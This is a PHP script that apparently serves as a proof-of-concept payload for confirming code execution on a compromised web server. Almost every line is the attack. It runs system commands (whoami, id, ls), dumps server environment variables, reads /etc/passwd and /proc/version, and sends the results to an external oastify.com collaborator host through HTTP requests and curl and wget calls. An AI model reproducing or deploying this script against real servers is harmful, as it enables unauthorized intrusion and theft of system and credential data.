<?php
$collab = "http://o0pvdlvwwpalel0rkcqm89y4tvzmndb2.oastify.com/";
$data = [];

// Test 1: Basic system commands
$data['test'] = 'php_execution';
$data['user'] = trim(shell_exec('whoami'));
$data['pwd'] = trim(shell_exec('pwd'));
$data['hostname'] = trim(shell_exec('hostname'));
$data['php_version'] = phpversion();
$data['os'] = php_uname();

// Test 2: File system info
$data['cwd_files'] = base64_encode(serialize(scandir('.')));
$data['document_root'] = $_SERVER['DOCUMENT_ROOT'] ?? 'none';

// Test 3: Network info  
$data['server_ip'] = $_SERVER['SERVER_ADDR'] ?? 'none';
$data['remote_ip'] = $_SERVER['REMOTE_ADDR'] ?? 'none';

// Test 4: PHP config
$data['disabled_funcs'] = ini_get('disable_functions') ?: 'none';
$data['safe_mode'] = ini_get('safe_mode') ? 'on' : 'off';

// Test 5: File operations
$test_file = 'test_' . uniqid() . '.txt';
file_put_contents($test_file, 'php_write_test');
$data['file_write'] = file_exists($test_file) ? 'success' : 'failed';
if(file_exists($test_file)) unlink($test_file);

// Test 6: Network outbound
$data['network_test'] = @fsockopen("google.com", 80, $errno, $errstr, 3) ? 'success' : 'failed';

// Test 7: Command execution
$data['id_command'] = trim(shell_exec('id 2>&1'));
$data['ls_command'] = base64_encode(shell_exec('ls -la 2>&1'));

// Test 8: Environment variables
$data['env'] = base64_encode(serialize($_SERVER));

// Send all data to collaborator
$url = $collab . "?" . http_build_query($data);
file_get_contents($url);

// Test 9: Multiple requests for confirmation
file_get_contents($collab . "?confirm=request_1");
sleep(1);
file_get_contents($collab . "?confirm=request_2"); 
sleep(1);
file_get_contents($collab . "?confirm=request_3");

// Test 10: POST data
$post_data = ['post_test' => 'success', 'timestamp' => time()];
$context = stream_context_create([
    'http' => [
        'method' => 'POST',
        'content' => http_build_query($post_data)
    ]
]);
file_get_contents($collab . "?method=post", false, $context);

// Test 11: Database connectivity check
if(function_exists('mysqli_connect')) {
    file_get_contents($collab . "?mysql=available");
}
if(function_exists('pg_connect')) {
    file_get_contents($collab . "?pgsql=available");
}

// Test 12: Large data exfiltration attempt
$large_data = [
    'passwd' => file_exists('/etc/passwd') ? base64_encode(file_get_contents('/etc/passwd')) : 'no_access',
    'proc_version' => file_exists('/proc/version') ? base64_encode(file_get_contents('/proc/version')) : 'no_access'
];
file_get_contents($collab . "?large_data=" . base64_encode(serialize($large_data)));

// Final confirmation
file_get_contents($collab . "?final=php_execution_confirmed");

// Test 13: Error-based test
system('curl -s http://o0pvdlvwwpalel0rkcqm89y4tvzmndb2.oastify.com/?curl_works=yes');

// Test 14: Wget test
system('wget -q -O - http://o0pvdlvwwpalel0rkcqm89y4tvzmndb2.oastify.com/?wget_works=yes');

echo "PHP Execution Test Complete";
?>
